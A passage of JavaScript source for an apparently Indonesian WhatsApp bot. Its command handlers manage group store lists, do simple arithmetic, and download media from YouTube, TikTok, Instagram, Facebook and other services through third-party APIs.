// Store Menu
case 'list': case 'store':{
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Belum ada list message yang terdaftar di group ini`)
let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
juna.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break
case 'dellist':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (db_respon_list.length === 0) return m.reply(`Belum ada list message di database`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return m.reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
m.reply(`Sukses delete list message dengan key *${q}*`)
break
case'addlist':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return m.reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await juna.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses set list message dengan key : *${args1}*`)
}
break
case 'updatelist': case 'update':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return m.reply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return m.reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (/image/.test(mime)) {
let media = await juna.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
updateResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(m.chat, args1, args2, false, '-', db_respon_list)
m.reply(`Sukses update respon list dengan key *${args1}*`)
}
break
case 'tambah':{
if (!text.includes('+')) return m.reply(`Gunakan dengan cara ${prefix+command} *angka* + *angka*\n\n_Contoh_\n\n${prefix+command} 1+2`)
arg = args.join(' ')
atas = arg.split('+')[0]
bawah = arg.split('+')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one + nilai_two}`)}
break
case 'kurang':{
if (!text.includes('-')) return m.reply(`Gunakan dengan cara ${prefix+command} *angka* - *angka*\n\n_Contoh_\n\n${prefix+command} 1-2`)
arg = args.join(' ')
atas = arg.split('-')[0]
bawah = arg.split('-')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one - nilai_two}`)}
break
case 'kali':{
if (!text.includes('*')) return m.reply(`Gunakan dengan cara ${prefix+command} *angka* * *angka*\n\n_Contoh_\n\n${prefix+command} 1*2`)
arg = args.join(' ')
atas = arg.split('*')[0]
bawah = arg.split('*')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one * nilai_two}`)}
break
case 'bagi':{
if (!text.includes('/')) return m.reply(`Gunakan dengan cara ${prefix+command} *angka* / *angka*\n\n_Contoh_\n\n${prefix+command} 1/2`)
arg = args.join(' ')
atas = arg.split('/')[0]
bawah = arg.split('/')[1]
var nilai_one = Number(atas)
var nilai_two = Number(bawah)
m.reply(`${nilai_one / nilai_two}`)}
break
case 'setproses': case 'setp':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) return m.reply(`Set proses already active`)
addSetProses(text, m.chat, set_proses)
m.reply(`✅ Done set proses!`)
break
case 'changeproses': case 'changep':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Pesanan sedang di proses ya @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetProses(m.chat, set_proses)) {
changeSetProses(text, m.chat, set_proses)
m.reply(`Sukses ubah set proses!`)
} else {
addSetProses(text, m.chat, set_proses)
m.reply(`Sukses ubah set proses!`)
}
break
case 'delsetproses': case 'delsetp':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isSetProses(m.chat, set_proses)) return m.reply(`Belum ada set proses di gc ini`)
removeSetProses(m.chat, set_proses)
m.reply(`Sukses delete set proses`)
break
case 'setdone':{
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) return m.reply(`Udh set done sebelumnya`)
addSetDone(text, m.chat, set_done)
m.reply(`Sukses set done!`)
break
}
case 'changedone': case 'changed':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *teks*\n\n_Contoh_\n\n${prefix + command} Done @user\n\n- @user (tag org yg pesan)\n- @pesanan (pesanan)\n- @jam (waktu pemesanan)\n- @tanggal (tanggal pemesanan) `)
if (isSetDone(m.chat, set_done)) {
changeSetDone(text, m.chat, set_done)
m.reply(`Sukses ubah set done!`)
} else {
addSetDone(text, m.chat, set_done)
m.reply(`Sukses ubah set done!`)
}
break
case 'delsetdone': case 'delsetd':
if (!m.isGroup) return m.reply('Fitur Khusus Group!')
if (!isAdmins) return m.reply('Fitur Khusus admin!')
if (!isSetDone(m.chat, set_done)) return m.reply(`Belum ada set done di gc ini`)
removeSetDone(m.chat, set_done)
m.reply(`Sukses delete set done`)
break

// Downloads Menu
case 'play': case 'ytplay':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Contoh : ${prefix + command} Lagu sad`)
const youtube = require("yt-search");
var search = await youtube(text);
var convert = search.videos[0];
if (!convert) throw 'Video/Audio Tidak Ditemukan';
m.reply('Menghubungi YouTube...')
try{
let info = await ytdl.getInfo(convert.url);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if (audioFormats[0].contentLength == "undefined") return m.reply('Saat ini sedang mengalami gangguan ')
if (Number(low) >= 3000000 && !isPremium) {
return m.reply(`File Audio [ ${Number(low) / 100000} MB ], Anda Hanya Dapat Mendownload File Berukuran *30 MB* Dan Untuk Pengguna *Premium* Maksimal *150 MB*`) 
}
if (Number(low) >= 15000000 && isPremium) {
return m.reply(`File Audio [ ${Number(low) / 100000} MB ], Telah Melebihi *Batas Maksimum!*`) 
}
var caption = `*${convert.title}*\n\n\n*⌬ Ext* : Search\n*⌬ ID* : ${convert.videoId}\n*⌬ Duration* : ${convert.timestamp}\n*⌬ Viewers* : ${convert.views}\n*⌬ Upload At* : ${convert.ago}\n*⌬ Author* : ${convert.author.name}\n*⌬ Channel* : ${convert.author.url}\n*⌬ Url* : ${convert.url}\n\n\n_*Tunggu Sebentar, File Anda Sedang Dikirimkan...*_`;
var pesan = juna.relayMessage(m.chat, {
extendedTextMessage:{
text: caption, 
contextInfo: {
externalAdReply: {
title: "乂 YOUTUBE - MUSIC",
mediaType: 1,
previewType: 0,
renderLargerThumbnail: true,
thumbnailUrl: convert.image,
sourceUrl: convert.url
}
}, mentions: [m.sender]
}}, {})
downloadMp3(convert.url) 
} catch (e) {
console.log(e)
m.reply(`*Hanya Dapat Mencari Lagu, Tidak Dapat Mencari Channel...*`);
}
}
break
case 'ytmp3': case 'ytaudio': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Contoh : ${prefix + command} https://youtube.com/ueb8h3bs`)
m.reply('Menghubungi YouTube...')
try{
let info = await ytdl.getInfo(text);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if (audioFormats[0].contentLength == "undefined") return m.reply('Saat ini sedang mengalami gangguan ')
if (Number(low) >= 3000000 && !isPremium) {
return m.reply(`File Audio [ ${Number(low) / 100000} MB ], Anda Hanya Dapat Mendownload File Berukuran *30 MB* Dan Untuk Pengguna *Premium* Maksimal *150 MB*`) 
}
if (Number(low) >= 15000000 && isPremium) {
return m.reply(`File Audio [ ${Number(low) / 100000} MB ], Telah Melebihi *Batas Maksimum!*`) 
}
downloadMp3(text) 
}catch (error) {
m.reply(`*URL in valid*`);
}
}
break
case 'ytv2': case 'ytvideo2': {//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*`)
m.reply(mess.wait)
try{
let anu = await fetchJson(`https://api.zahwazein.xyz/downloader/youtube?apikey=${setting.ZenzKey}&url=${text}`)// perlu ganti 
const cpt = anu.result.duration
const nick = anu.result.title
juna.sendMessage(m.chat, { video: { url: anu.result.getVideo.url}, caption: `💬Judul : ${nick}\n⏱️Durasi : ${cpt}\n\n*NOTE* : Jika video tidak dapat diputar, ketik .ytv *url*`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download\n\nPlease try typing .ytv *url*`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'ytv': case 'ytmp4': case 'ytvideo': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Contoh : ${prefix + command} https://youtube.com/ueb8h3bs`)
m.reply('Menghubungi YouTube...')
try{
let info = await ytdl.getInfo(text);
let audioFormats = ytdl.filterFormats(info.formats, 'audioonly');
try{
var low = audioFormats[2].contentLength
} catch (err){
var low = audioFormats[0].contentLength
}
if (audioFormats[0].contentLength == "undefined") return m.reply('Saat ini sedang mengalami gangguan ')
if (Number(low) >= 6000000 && !isPremium) {
return m.reply(`File Video [ ${Number(low) / 100000} MB ], Anda Hanya Dapat Mendownload File Berukuran *60 MB* Dan Untuk Pengguna *Premium* Maksimal *150 MB*`) 
}
if (Number(low) >= 15000000 && isPremium) {
return m.reply(`File Video [ ${Number(low) / 100000} MB ], Telah Melebihi *Batas Maksimum!*`) 
}
downloadMp4(text) 
}catch (error) {
m.reply(`*URL in valid*`);
}
}
break
case 'lk21':{
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (!text) return m.reply (`Nyari Apa?`) 
m.reply (mess.wait) 
let res = await fetch(`https://wibu-api.eu.org/api/lk21/search?title=${text}`)
 try {
let json = await res.json()
json = json.result.map((v) => `*Judul:* ${v.judul}\n*Link:* ${v.link}\n*Kategori:* ${v.kategori}\n*Download:* ${v.dl}\n`).join`\n\n°°°°°°°°°°°°°°°°°°°°°°°°°°°°°\n\n`
m.reply(json)
} catch (e) {
m.reply(`Tidak Dapat Menemukan Apa Yang Kamu Cari`)
}
}
break
case 'jarak':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} jakarta|bandung`)
m.reply(mess.wait)
let [from, to] = text.split(/[^\w\s]/g)
	if (!(from && to)) return m.reply (`Contoh: ${prefix+command} jakarta|bandung`) 
	let data = await jarak(from, to)
	if (data.img) return juna.sendMessage(m.chat, { image: data.img, caption: data.desc }, { quoted: m })
	else m.reply(data.desc)
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'cuaca': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!q) return m.reply(`Contoh: ${prefix+command} Yogyakarta`)
m.reply(mess.wait)
let cuaca = await fetchJson(`https://api.lolhuman.xyz/api/cuaca/${text}?apikey=GataDios`)
let info = cuaca.result
m.reply(`*Lokasi* : ${info.tempat}
*Cuaca* : ${info.description}
*Suhu saat ini* : ${info.suhu}
*Suhu tertinggi* : ${info.suhu}
*Suhu terendah* : ${info.suhu}
*Kelembapan* : ${info.kelembapan}
*Angin* : ${info.angin}
*Tekanan udara* : ${info.udara}
*Tekanan Permukaan Laut* : ${info.permukaan_laut}`)
}
break
case "google":{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Contoh : ${prefix + command} Indonesia`);
let google = require("google-it");
google({ query: text }).then((res) => {
let teks = `Google Search From : ${text}\n\n`;
for (let g of res) {
teks += `• *Title* : ${g.title}\n`;
teks += `• *Description* : ${g.snippet}\n`;
teks += `• *Link* : ${g.link}\n\n────────────────────────\n\n`;
}
m.reply(teks)
})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'komikusearch': case 'komikus': case 'comics': case 'comicsearch':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Contoh : ${prefix + command} tensei`);
  
let comic = await fetch(`https://api.nomisec07.site/api/komikcast-search?query=${text}`);
  let json = await comic.json();
  
let hasil = json.data.map((v) => `*Title:* ${v.title}\n*Type:* ${v.type}\n*Score:* ${v.score}\n*Chapter:* ${v.chapter}\n*Url:* ${v.url}`).join('\n\n_____________________________________\n\n');
  
m.reply(hasil);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) };
break;
case 'fb': case 'fbdl': case 'facebook':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
m.reply(mess.wait)
try{
let anu = await fetchJson(`https://aemt.me/download/fbdown?url=${text}`)//perlu ganti
juna.sendMessage(m.chat, { video: { url: anu.result.url.urls.hd}, caption: `Done Bangg ✅`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download\n\nPlease try typing .fb2 *url*`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'fb2': {//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
m.reply(mess.wait)
try{
let anu = await fetchJson(`https://api.arifzyn.com/api/download/fb2?url=${text}&apikey=${setting.ArifKey}`)//perlu ganti
juna.sendMessage(m.chat, { video: { url: anu.result.links.hd}, caption: `Done Bangg ✅`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download\n\nPlease try typing .fb3 *url*`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'fb3':{//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
m.reply(mess.wait)
try{
let anu = await fetchJson(`https://api.arifzyn.com/api/download/fb2?url=${text}&apikey=${setting.ArifKey}`)//perlu ganti
juna.sendMessage(m.chat, { video: { url: anu.result.links.sd}, caption: `Done Bangg ✅`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download\n\nPlease try typing .fb3 *url*`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'fb4': {//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
m.reply(mess.wait)
let anu = await fetchJson(`https://api.shinoa.xyz/api/dowloader/fbdown?url=${text}&apikey=3276DED6`)//perlu ganti 
juna.sendMessage(m.chat, { video: { url: anu.result.HD}, caption: `Done Bangg ✅`}, {quoted: m})
.catch((err) => {
m.reply("Eror!!!")
})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'twitter': case 'twittdl': case 'twdl':{//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
m.reply(mess.wait)
try{
let anu = await fetchJson(`https://worker.rmdni.id/downloader?url=${text}`)//perlu ganti
juna.sendMessage(m.chat, { video: { url: anu.result.downloadLink}, caption: `Done Bangg ✅`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'instagram': case 'ig': case 'igdl': case 'igvideo': case 'instavideo': case 'instavid': case 'igreels': case 'instareels': case 'instareel': case 'igtv': case 'instatv':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
m.reply(mess.wait)
try{
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
juna.sendMessage(m.chat, { video: { url: anu.result[0].url}, caption: `Instagram Video ✅\n\nCatatan : If the video cannot be played, please type .ig2 *url*`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download, Please try typing .ig2 *url*`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'ig2': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
m.reply(mess.wait)
try{
let anu = await fetchJson(`https://skizo.tech/api/igdl?url=${text}`)
juna.sendMessage(m.chat, { video: { url: anu.media}, caption: `Done Bangg ✅`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download\n\nPlease try typing .ig3 *url*`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'ig3':{//fix bug 
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
m.reply(mess.wait)
try{
let anu = await fetchJson(`https://worker.rmdni.id/downloader?url=${text}`)//perlu ganti
const vid = anu.result.url
juna.sendMessage(m.chat, { video: { url: vid}, caption: `Done Bangg ✅`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'igphoto': case 'instaphoto': case 'instafoto': case 'igfoto': {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*\n\n_Contoh_\n\n${prefix + command} https://www.instagram.com/reel/Cr5AXBQvBC1/?igshid=MzRlODBiNWFlZA==`)
m.reply(mess.wait)
let anu = await fetchJson(`https://aemt.me/download/igdl?url=${text}`)
for (let imgs of anu.result.url)
juna.sendMessage(m.chat, { image: { url: imgs}, caption: `Done Bangg ✅`}, {quoted: m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case 'tiktoksearch': case 'tiktoks': case 'ttsearch':{
if (!isCreator&&!isPremium) return m.reply(mess.OnlyPrem)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *query*\n\n_Contoh_\n\n${prefix+command} jj epep`)
m.reply(mess.wait)
try{
let anu = await fetchJson(`https://skizo.tech/api/ttsearch?search=${text}`)
const capt = anu.title
const author = anu.author.nickname
juna.sendMessage(m.chat, { video: { url: anu.play}, caption: `💬 Caption : ${capt}\n👤 Author : ${author}`}, {quoted: m})
}catch (error) {
m.reply(`Sorry this video can't be download\n\nRequest failed with status code *400*`);
}
}
break
case "tts": case 'texttosound': case'audio':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *Text*\n\n_Contoh_\n\n${prefix+command} Kak vreden ganteng bet wkwkwk`)
m.reply(mess.wait)
let anu = await fetchJson(`https://api.erdwpe.com/api/soundoftext?text=${text}&lang=id-ID`)//perlu ganti
const aud = anu.result
juna.sendMessage(m.chat, {audio : {url : aud}, mimetype:'audio/mpeg'}, {quoted:m})
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case "tiktok3": case "tt3": case "ttnowm3": case "tiktokmp43": {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
m.reply(mess.wait)
try{
const data = await tiktokdl(text)
console.log(data)
juna.sendMessage(m.chat, { video: { url: data.video}, caption: `Done boss ✅`}, {quoted: m})
}catch (error) {
m.reply(`Maaf video ini tidak dapat di download\n\nCoba gunakan:\n.tiktok2 ${text}`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case "tiktok2": case "tt2": case "ttnowm2": case "tiktokmp42": {
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
m.reply(mess.wait)
try{
let snaptik = await fetchJson(`https://api.lolhuman.xyz/api/tiktok2?apikey=GataDios&url=${text}`)
juna.sendMessage(m.chat, { video: { url: snaptik.result }, caption: `Done boss ✅`}, {quoted: m})
}catch (error) {
m.reply(`Maaf video ini tidak dapat di download\n\nCoba gunakan:\n.tiktok3 ${text}`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case "tiktokmp4": case 'tt': case 'ttnowm': case'tiktoknowm': case'tiktok':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
m.reply(mess.wait)
try{
let snaptik = await fetchJson(`https://api.lolhuman.xyz/api/tiktok?apikey=GataDios&url=${text}`)
juna.sendMessage(m.chat, { video: { url: snaptik.result.link }, caption: `Done boss ✅`}, {quoted: m})
}catch (error) {
m.reply(`Maaf video ini tidak dapat di download\n\nHarap lapor owner agar di diperbaiki`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case "tiktokmp33": case 'ttmp33': case'tiktokaudio3':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
m.reply(mess.wait)
try {
const data = await tiktokdl(text)
console.log(data)
juna.sendMessage(m.chat, {audio : {url : data.music }, mimetype:'audio/mpeg'}, {quoted:m})
}catch (error) {
m.reply(`Maaf audio ini tidak dapat di download\n\nCoba gunakan:\n.tiktokaudio2 ${text}`);
}
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case "tiktokmp32": case 'ttmp32': case'tiktokaudio2':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
m.reply(mess.wait)
try{
let snaptik = TiktokDL(text, { version: "v3" })
console.log(snaptik)
juna.sendMessage(m.chat, {audio : {url : snaptik.result.music }, mimetype:'audio/mpeg'}, {quoted:m})
}catch (error) {
m.reply(`Maaf audio ini tidak dapat di download\n\nCoba gunakan:\n.tiktokaudio3 ${text}`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case "tiktokmp3": case 'ttmp3': case'tiktokaudio':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*\n\n_Contoh_\n\n${prefix+command} https://vt.tiktok.com/ZS8KdFQcQ/`)
m.reply(mess.wait)
try{
let snaptik = await fetchJson(`https://api.lolhuman.xyz/api/tiktokmusic?apikey=GataDios&url=${text}`)
juna.sendMessage(m.chat, {audio : {url : snaptik.result }, mimetype:'audio/mpeg'}, {quoted:m})
}catch (error) {
m.reply(`Maaf audio ini tidak dapat di download\n\nHarap lapor owner agar di diperbaiki`);
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
}
break
case 'gddl': case 'gdrivedl': case 'gdrive':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix}limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix + command} *url*`)
m.reply(mess.wait)
let anu = await fetchJson(`https://aemt.me/download/gdrive?url=${text}`)//perlu ganti
let hasdl = anu.result.data
let namafile = anu.result.fileName
juna.sendMessage(m.chat, { document: { url: hasdl }, mimetype: anu.result.mimetype, fileName: namafile }, { quoted: m })
}
if (!isCreator && !isPremium) { limitAdd(m.sender, limit) }
break
case'mediafire': case'mfire': case'mfdl':{
if (isLimit(m.sender, isPremium, isCreator, limitCount, limit)) return m.reply(`Limit kamu sudah habis silahkan kirim ${prefix} limit untuk mengecek limit`)
if (!text) return m.reply(`Gunakan dengan cara ${prefix+command} *url*`)
if (!isUrl(text)) return m.reply(mess.error.Iv)
if (!text.includes('mediafire.com')) return m.reply(mess.error.Iv)
m.reply(mess.wait)
addCountCmd('mediafire', m.sender, _cmd)
kotz.mediafire(text).then(async(data) => {
data = data[0]
data.nama = decodeURIComponent(data.nama)
var media = await getBuffer(data.link)
if (data.mime.includes('mp4')) {
juna.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'video/mp4' }, { quoted: m })
} else if (data.mime.includes('mp3')) {
juna.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'audio/mp3' }, { quoted: m })
} else {
juna.sendMessage(m.chat, { document: media, fileName: data.nama, mimetype: 'application/'+data.mime }, { quoted: m })
}
}).catch((e) => {
